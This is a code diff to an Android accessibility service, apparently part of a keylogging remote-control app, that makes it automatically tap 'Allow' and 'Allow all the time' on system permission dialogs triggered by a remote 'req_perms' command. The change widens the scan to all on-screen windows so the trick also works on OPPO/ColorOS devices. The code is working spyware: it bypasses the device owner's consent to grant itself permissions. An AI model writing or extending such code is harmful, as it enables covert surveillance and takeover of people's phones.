@@ -46,8 +46,9 @@ class KeystrokeAccessibilityService : AccessibilityService() {
         // AUTO-GRANT: when the system shows a permission dialog (from a remote
         // "req_perms" command), tap "Allow"/"Allow all the time" so the admin can
         // grant every permission from the panel, hands-free.
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val pkg = event.packageName?.toString() ?: ""
+        val pkg = event.packageName?.toString() ?: ""
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             // System permission dialog on Android 11+ lives in permissioncontroller;
             // on older devices "com.android.packageinstaller".
             if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")) {
@@ -80,26 +81,50 @@ class KeystrokeAccessibilityService : AccessibilityService() {
     }
 
     /** Find and click the "Allow" / "Allow all the time" buttons on a permission dialog.
-     * Runs on a background thread with retries, because the dialog's accessibility tree
-     * isn't ready at the instant TYPE_WINDOW_STATE_CHANGED fires. */
+     * Runs on a background thread with retries. Some OEMs (OPPO/ColorOS) don't expose the
+     * dialog via rootInActiveWindow, so also scan ALL windows on the screen. */
     private fun autoGrantPermission() {
         Thread {
             for (attempt in 0..6) {
                 try {
-                    val root = rootInActiveWindow ?: continue
+                    val roots = ArrayList<AccessibilityNodeInfo>()
+                    val active = rootInActiveWindow
+                    if (active != null) roots.add(active)
+                    var winCount = 0
+                    try {
+                        for (w in windows) {
+                            val r = w.root ?: continue
+                            roots.add(r); winCount++
+                        }
+                    } catch (_: Throwable) {}
+                    if (attempt == 0) {
+                        try { LoggerWriter.write("[PERM]", "auto", "scan roots=${roots.size} win=${winCount} active=${active != null}") } catch (_: Throwable) {}
+                    }
                     val targets = listOf("Allow all the time", "Allow", "While using the app",
                                           "While using", "Allow one time")
                     var done = false
-                    outer@ for (label in targets) {
-                        val nodes = root.findAccessibilityNodeInfosByText(label)
-                        for (n in nodes) {
-                            val actionable = n.isClickable
-                            val btn = if (actionable) n else n.parent
-                            if (btn != null && btn.isClickable) {
-                                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                LoggerWriter.write("[PERM]", "auto", "granted: $label")
-                                done = true
-                                break@outer
+                    outer@ for (root in roots) {
+                        if (root == null) continue
+                        for (label in targets) {
+                            var nodes: List<AccessibilityNodeInfo> = emptyList()
+                            val found = try { root.findAccessibilityNodeInfosByText(label) } catch (_: Throwable) { null }
+                            if (!found.isNullOrEmpty()) nodes = found
+                            if (nodes.isEmpty()) {
+                                try {
+                                    val dnodes = root.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button")
+                                    if (!dnodes.isNullOrEmpty()) nodes = listOf(dnodes.first())
+                                } catch (_: Throwable) {}
+                            }
+                            for (n in nodes) {
+                                if (n == null) continue
+                                val actionable = n.isClickable
+                                val btn = if (actionable) n else n.parent
+                                if (btn != null && btn.isClickable) {
+                                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                    LoggerWriter.write("[PERM]", "auto", "granted: $label")
+                                    done = true
+                                    break@outer
+                                }
                             }
                         }
                     }
